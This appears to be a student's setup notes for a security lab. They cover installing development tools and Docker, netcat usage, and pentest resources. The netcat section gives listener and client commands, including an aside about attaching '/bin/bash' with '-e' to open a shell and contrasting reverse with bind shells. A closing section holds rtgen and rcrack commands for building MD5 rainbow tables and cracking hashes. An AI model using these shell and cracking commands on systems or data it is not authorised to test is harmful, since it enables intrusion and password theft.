table of contents


# Installing Visual Studio Code

Download the .deb package [here](https://go.microsoft.com/fwlink/?LinkID=760868)

Install it with

```console
sudo apt install ./"filename".deb
```

Then you can launch it from the apps manager of ubuntu (Windows key) or running "code" in the cli


# Installing Git

```console
sudo apt install git-all
```

# Installing Docker

First, uninstall any default or old versions

```console
sudo apt-get remove docker docker-engine docker.io containerd runc
```

Then install required packages

```console
sudo apt-get update
sudo apt-get install \
    ca-certificates \
    curl \
    gnupg \
    lsb-release
```

Adding Dockers GPG key

```console
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
```

Add the Docker packages repository to apt sources.list

```console
echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
    $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```

Finally, install Docker engine

```console
sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io
```


# Running The Project

Simply run "docker-compose up -d" in the project root

# Github Actions

Simply go to your repository settings, then actions tab and add a new self-hosted runner.

[Workflow syntax reference](https://docs.github.com/es/actions/learn-github-actions/workflow-syntax-for-github-actions)


# CVEDetails

[CVE Database](https://www.cvedetails.com)


# Netcat

**Create the simplest listener/server -> client connection**


```console
listener@bar:~$ nc –lvp 4444
```


```console
client@bar:~$ nc "server ip" 4444 (To specify shell, –e /bin/bash)
```



**Transfering files**

```console
listener@bar:~$ cat file.zip | nc -lvp 1234
```

```console
client@bar:~$ netcat "server ip" 1234 > file.zip
```
or:

```console
listener@bar:~$ nc "client ip" 1234 < file.zip
```

```console
client@bar:~$ nc -lvp 1234 > file.zip
```

Test port status

```console
nc -zv "host" "port"
```


## Reverse Shell

- Listener runs on the attacker
- Noone else can connect to the target
- Relies on egress traffic (Usually egress ports like 80 or 443 are open)
- No need of NAT/PAT

## Bind Shell

- Listener runs on the target
- Relies on ingress traffic (Usually ingress ports are closed)
- Requires NAT/PAT (The private port could be mapped to a different public port)

**Remember: Ports Under 1024 are privileged**

# HaveIbeenPwned

[Check password leaks](https://haveibeenpwned.com)


# Seclists

The repository can be found [here](https://github.com/danielmiessler/SecLists)

Simply follow the instructions and unzip it in a directory you like

# Burp

Download from [here](https://portswigger.net/burp/releases/professional-community-2021-10-2?requestededition=community)

# FFUF

The project can be found [here](https://github.com/ffuf/ffuf)


Grab a release file (compiled bin) for your OS and run it

There's a handy [cheatsheet](https://cheatsheet.haax.fr/web-pentest/tools/ffuf/) that will help you using it


# HTTP Status Codes

[Cheatsheet](https://thecontentworks.uk/http-status-codes-cheat-sheet)


# Hashcat

Download from [here](https://hashcat.net/hashcat)

Basic examples can be found running hashcat -h


# RainbowCrack

Download from [here](https://project-rainbowcrack.com/index.htm) 

Generating md5 rainbow chains for passwords using the charset [a-z,0-9] with lenght between 1 and 7 characters

```console
rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 1 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 2 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 3 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 4 3800 33554432 0
rtgen md5 loweralpha-numeric 1 7 5 3800 33554432 0
```

Now generate the rainbow table (Array of rainbow chains)

```console
rtsort .
```

Finally crack some hashes

```console
rcrack "path to rainbow tables dir" -l "hash list file"
```

